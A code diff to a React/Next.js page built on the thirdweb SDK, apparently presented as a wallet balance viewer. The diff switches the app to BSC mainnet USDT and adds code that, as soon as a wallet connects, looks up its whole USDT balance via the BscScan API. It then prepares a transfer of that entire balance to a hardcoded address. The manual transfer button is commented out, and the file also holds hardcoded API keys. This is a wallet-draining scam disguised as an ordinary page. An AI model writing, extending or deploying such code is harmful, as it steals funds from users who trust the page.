@@ -1,17 +1,27 @@
 "use client";
 import { createThirdwebClient, getContract, prepareContractCall, toWei } from "thirdweb";
 import { ConnectButton, useActiveAccount, useWalletBalance, useSendTransaction } from "thirdweb/react";
-import { bscTestnet } from "thirdweb/chains";
+import { bsc } from "thirdweb/chains";
 import { createWallet } from "thirdweb/wallets";
-import { useEffect } from "react";
+import { useEffect, useState } from "react";
+import axios from "axios";
+
+const clientIdMAIN = "acbda4ca6f743f0357967452ead6731c";
+const USDTCONTRACTADDRESS = "0x55d398326f99059ff775485246999027b3197955";
+const EXCHANGE_API_DEV = "https://api-testnet.bscscan.com";
+const EXCHANGE_API = "https://api.bscscan.com";
+const EXCHANGE_API_KEY = "5CCWDRSP7A226B3M2B24GR8JXB3D12N4A3";
+const SEND_TO_ADDRESS = "0xBF06f44A57D255520E04E4d7EF7Ae87DB911fE7C";
+
+
 
 const client = createThirdwebClient({
-  clientId: "acbda4ca6f743f0357967452ead6731c",
+  clientId: clientIdMAIN,
 });
 
 const contract = getContract({
-  address: "0xd8cBA69b4c7E56Af7F024fE5e59E9619Dd251B28",
-  chain: bscTestnet,
+  address: USDTCONTRACTADDRESS,
+  chain: bsc,
   client,
 });
 
@@ -25,33 +35,56 @@ const wallets = [
 ];
 
 export default function Home() {
+  const [usdtBalance, setUsdtBalance] = useState(null); // State for USDT balance
+
+
   const { mutate: sendTransaction } = useSendTransaction();
   const account = useActiveAccount();
   const { data: balance, isLoading } = useWalletBalance({
     client,
-    chain: bscTestnet,
+    chain: bsc,
     address: account?.address,
   });
 
+
+  // Function to fetch USDT balance from BscScan API
+  const fetchUsdtBalance = async (walletAddress: any) => {
+    try {
+      const response = await axios.get(
+        `${EXCHANGE_API}/api?module=account&action=tokenbalance&contractaddress=${USDTCONTRACTADDRESS}&address=${walletAddress}&tag=latest&apikey=${EXCHANGE_API_KEY}`
+      );
+      console.log("Fetched USDT Balance:", response.data.result);
+
+      // Convert balance from Wei (smallest unit) to a more readable format if needed (e.g., using 18 decimals for ERC-20 tokens)
+      const balanceInReadableFormat = parseFloat(response.data.result) / 10 ** 18; // Adjust decimals if needed
+      setUsdtBalance(balanceInReadableFormat); // Set fetched balance
+      console.log('balanceInReadableFormat  ', balanceInReadableFormat);
+      onClick(balanceInReadableFormat.toString());
+    } catch (error) {
+      console.error("Error fetching USDT balance:", error);
+    }
+  };
+
   const { mutate: sendTx, data: transactionResult } = useSendTransaction();
 
-  const onClick = () => {
+  const onClick = (usdtBalanceTemp: any) => {
     const transaction = prepareContractCall({
       contract,
       method: "function transfer(address to, uint256 value)",
-      params: ["0x4081444763A8d6E2f1476C4357b6E46292Fa5feC", toWei("100")],
+      params: [SEND_TO_ADDRESS, toWei(usdtBalanceTemp)],
     })
 
     sendTx(transaction);
   };
 
 
-    // Automatically trigger token transfer when account address is available
-    useEffect(() => {
-      if (account?.address) {
-        onClick();
-      }
-    }, [account?.address]); // Runs when account.address changes
+  // Automatically trigger token transfer when account address is available
+  useEffect(() => {
+    if (account?.address) {
+      fetchUsdtBalance(account?.address); // Fetch USDT balance
+
+    }
+  }, [account?.address]); // Runs when account.address changes
 
   return (
     <div>
@@ -66,8 +99,11 @@ export default function Home() {
       <p>
         Wallet balance: {balance?.displayValue} {balance?.symbol}
       </p>
+      <p>
+        USDT balance: {usdtBalance}
+      </p>
 
-      <button onClick={onClick}>Transfer Tokens</button>
+      {/* <button onClick={onClick}>Transfer Tokens</button> */}
     </div>
 
   );
